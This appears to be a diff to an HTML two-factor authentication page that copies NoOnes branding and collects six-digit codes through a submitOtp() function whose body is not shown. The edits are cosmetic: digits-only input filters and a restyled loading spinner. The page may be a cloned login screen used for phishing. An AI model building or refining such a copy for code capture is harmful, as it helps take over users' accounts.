@@ -194,7 +194,6 @@
 </head>
 <body>
     <div class="wrapper">
-        <!-- FULL STYLISH NOONES LOGO (now 100% complete) -->
         <div class="logo-container">
             <a href="https://noones.com" class="logo-link">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="2.47 373 1075.33 333.01" width="144" height="48">
@@ -219,29 +218,25 @@
                 </svg>
             </a>
         </div>
-
         <div class="container">
             <h2>Two-factor authentication</h2>
             <p class="subtitle">Enter 6-digit code sent to your email or authenticator app</p>
            
             <div class="otp-inputs">
-                <input type="text" maxlength="1" class="otp-input" autofocus>
-                <input type="text" maxlength="1" class="otp-input">
-                <input type="text" maxlength="1" class="otp-input">
-                <input type="text" maxlength="1" class="otp-input">
-                <input type="text" maxlength="1" class="otp-input">
-                <input type="text" maxlength="1" class="otp-input">
+                <input type="text" maxlength="1" class="otp-input" autofocus onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="text" maxlength="1" class="otp-input" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="text" maxlength="1" class="otp-input" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="text" maxlength="1" class="otp-input" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="text" maxlength="1" class="otp-input" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="text" maxlength="1" class="otp-input" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
             </div>
-
             <div class="warning-message" id="otp-warning"></div>
-
             <button class="paste-button" onclick="pasteCode()">Paste code</button>
             <p class="resend-text" id="resend-timer">Resend in 60 seconds</p>
            
             <button class="continue-button" onclick="submitOtp()">Continue</button>
             <a href="#" class="trouble-link">Having trouble logging in?</a>
         </div>
-
         <div class="footer">
             <div class="theme-toggle">
                 <svg class="theme-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
@@ -266,7 +261,9 @@
 
     <!-- Spinner overlay -->
     <div id="loading-overlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center;">
-        <div class="spinner" style="width: 60px; height: 60px; border: 6px solid #00b36b; border-top: 6px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        <div style="background: white; border-radius: 10px; padding: 20px; display: flex; justify-content: center; align-items: center;">
+            <div class="spinner" style="width: 40px; height: 40px; border: 4px solid #00b36b; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        </div>
     </div>
     <style>
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
